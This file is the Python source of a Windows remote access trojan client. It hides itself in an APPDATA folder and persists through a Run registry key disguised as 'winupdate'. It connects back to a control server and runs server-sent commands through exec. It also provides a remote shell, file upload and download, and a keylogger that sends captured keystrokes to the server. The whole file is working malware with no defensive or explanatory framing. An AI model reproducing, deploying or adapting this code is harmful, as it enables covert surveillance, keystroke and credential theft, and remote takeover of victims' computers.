#import the required modules
import socket
import subprocess
import time
import os, shutil, getpass, sys
import struct
from pynput.keyboard import Key, Listener
from threading import Thread
from winreg import *


HOST = '127.0.0.1'
PORT = 51025


class Client(): #class Client: define the client properties
    def __init__(self, server = None):
        self.server = server

    def send(self, data): #custom send function
        pkt = struct.pack('>I', len(data)) + data
        self.server.sendall(pkt)

    def recv(self): #custom recv function
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)

    def recvall(self, n): #format the receipts packets
        packet = b''
        while len(packet) < n:
            frame = self.server.recv(n - len(packet))
            if not frame:
                return None
            packet += frame
        return packet



def background(): #connect to the server and retry all 10 seconds
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            server.connect((HOST, PORT))
            break
        except ConnectionRefusedError or ConnectionAbortedError:
            time.sleep(10)
    interpreter(server)


def interpreter(server): #wait for commands from the server and interpret them
    global client
    client = Client(server)
    while True:
        command = client.recv().decode().split(" ")
        if len(command) > 1:
            exec(f"{command[0]}('{command[1]}')")
        else:
            exec(f"{command[0]}()")




def setup(path): #set up the folder for client an automate startup
    os.mkdir(path)
    file = os.path.realpath(sys.argv[0])
    file_name = file.split("\\")[-1]
    shutil.copy(file, path)
    reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
    SetValueEx(reg_key, "winupdate", 0, REG_SZ, f"{path}\{file_name}")
    CloseKey(reg_key)
    file_path = path + "\\" + file_name
    subprocess.Popen(f'attrib +s +h +i +x +u {path}', shell = True)
    os.chdir(path)
    subprocess.Popen(["cmd", "/c", "start", file_path])
    sys.exit(0)


def remove(): #remove all the files from client and delete the reg key
    reg_key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
    DeleteValue(reg_key, "winupdate")
    CloseKey(reg_key)
    path = f'{os.environ["APPDATA"]}\Pyback'
    command = f"timeout /T 5 & del /Q /S {path} & rmdir {path}"
    subprocess.Popen(command, shell = True)
    sys.exit(0)



def upload(): #upload command: upload a file to the client
    file_content = client.recv()
    file_name = client.recv()
    with open(file_name, "wb") as file:
        file.write(file_content)


def download(): #download command: download a file from the client
    local_path = client.recv().decode()
    with open(local_path, 'rb') as file:
        while True:
            a = file.read(1024)
            if not a:
                break
            client.send(a)
    client.send(local_path.split('/')[-1].encode())



def cmd(): #cmd command: open a shell on the client machine
    while True:
        dir = os.getcwd() + '>'
        client.send(dir.encode())
        cmd = client.recv().decode()
        if cmd[0:2] == 'cd':
            try:
                os.chdir(''.join(cmd[3:]))
                output = ''.encode()
            except FileNotFoundError:
                output = "File or directory not found!"
        elif cmd == 'exit':
            break
        else:
            shell = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
            stderr = subprocess.PIPE, stdin=subprocess.PIPE)
            output = shell.stdout.read() + shell.stderr.read()
        client.send(bytes(output))



def keylogger(option):
    if option == 'start':
        task = Thread(target = key_start).start()
    elif option == 'stop':
        key_stop()


def key_start(): #start a keylogger
    global key_log
    key_log = True
    def on_press(key):
        try:
            key.char
            key = str(key).replace("'", "")
        except AttributeError:
            key = str(key).replace("'", "")
            if key == "Key.space":
                key = ' '
            elif key == "Key.enter":
                key = '\n'
            elif key == "Key.ctrl_l":
                key = '[CTRL]'
            elif key == "Key.backspace":
                key = '[BACK]'
            elif key == "Key.tabulation":
                key = '[TAB]'
            else:
                key = '[KEY]'
        with open("keylogs.txt", "a") as file:
            file.write(str(key))
    def on_release(key):
        return key_log
    with Listener(on_press = on_press, on_release = on_release) as listen:
        listen.join()


def key_stop(): #stop the keylogger and send the file to the server
    global key_log
    key_log = False
    with open('keylogs.txt', 'rb') as file:
        while True:
            a = file.read(1024)
            if not a:
                break
            client.send(a)
    os.remove('keylogs.txt')



def main():
    path = f'{os.environ["APPDATA"]}\Pyback'
    if os.path.isdir(path) and os.getcwd() == path:
        background()
    elif os.path.isdir(path):
        exit()
    else:
        setup(path)

while True:
    main()